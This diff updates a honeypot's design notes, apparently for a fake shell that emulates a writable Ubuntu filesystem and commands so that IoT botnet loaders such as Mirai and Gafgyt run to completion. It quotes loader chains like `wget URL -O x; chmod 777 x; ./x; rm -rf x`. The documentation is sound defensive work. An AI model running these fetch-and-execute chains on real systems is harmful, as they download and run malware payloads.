@@ -125,9 +125,16 @@ behind `/proc/mounts`, `/proc/self/mounts`, `/etc/mtab`, `/proc/self/mountinfo` 
 shell's `mount` (a stock Ubuntu cloud image on `/dev/sda1`; every mount point it names is
 a directory the shell will enter). Directories include `/`, `/tmp`, `/root`, `/etc`,
 `/home/ubuntu`, the loader-probed `/var/run`, `/mnt`, `/usr`, `/dev`, `/dev/shm`, and the
-`/sys`, `/run` and `/boot` subtrees the mount table names. A file the attacker creates
-with a bare redirection and then `chmod`s executable runs silently, so the
-`>/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/` probe completes.
+`/sys`, `/run` and `/boot` subtrees the mount table names. `/bin/busybox`, `/bin/sh`,
+`/bin/bash` and `/usr/bin/wget` are present and executable, so the `cp /bin/busybox x`
+staging step has something to copy.
+
+The snapshot is **writable for the length of one session**: a bare redirection, a fetch
+that saves to a file, `cp`, `mkdir` and `rm` all change what the rest of that session
+sees, and `chmod` marks a file executable so running it succeeds. That is what lets a
+loader chain behave: `>/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/` completes, and
+`wget URL -O x; chmod 777 x; ./x; rm -rf x` finds its payload at every step and leaves
+nothing behind. Nothing persists between sessions.
 
 ### Fake shell (SSH, Telnet, ADB)
 
@@ -149,8 +156,10 @@ I/O (`:9-29`). This is asserted by `never_exec_static_check` and
 - Implemented commands (`dispatch`, `:183-229`): `uname` (real per-flag field
   selection), `id`/`whoami`/`pwd`, `echo` (Gafgyt/BASHLITE `\xHH`-decoding
   handshake returning `GAYFGT`, `:647-776`), `cat` (fakefs plus a special
-  `/proc/self/cmdline` returning argv), `ls`, `wget`/`curl` (canned transcripts,
-  `-O-`/`-qO-` writes body to stdout), `ping` (canned replies), `sh`/`bash`/`ash`
+  `/proc/self/cmdline` returning argv), `ls` (sorted, dotfiles hidden without `-a`),
+  `cp`/`rm`/`mkdir` (they change the session's filesystem and report the real errors),
+  `wget`/`curl` (canned transcripts, `-O-`/`-qO-` writes body to stdout, a saved
+  download becomes a file), `ping` (canned replies), `sh`/`bash`/`ash`
   (nested shell; `sh -c "CMD"` dispatches CMD), `enable` (bash's builtin list, since
   Mirai's telnet preamble sends it and only a non-bash says "command not found"), `mount`
   (the fake filesystem's mount table), `busybox` (multi-call banner
